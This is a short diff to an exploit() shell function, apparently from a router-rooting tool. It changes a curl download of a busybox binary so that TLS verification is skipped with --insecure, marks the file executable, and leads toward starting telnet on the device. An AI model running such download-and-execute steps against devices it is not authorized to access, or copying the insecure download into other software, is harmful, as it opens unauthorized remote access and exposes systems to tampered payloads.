@@ -14,7 +14,8 @@ exploit() {
 
     cd /tmp
     rm -rf busybox
-    curl "https://www.busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel" --output busybox
+    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
+    curl "https://www.busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel" --insecure --output busybox
     chmod +x busybox
 
     # Start telnet
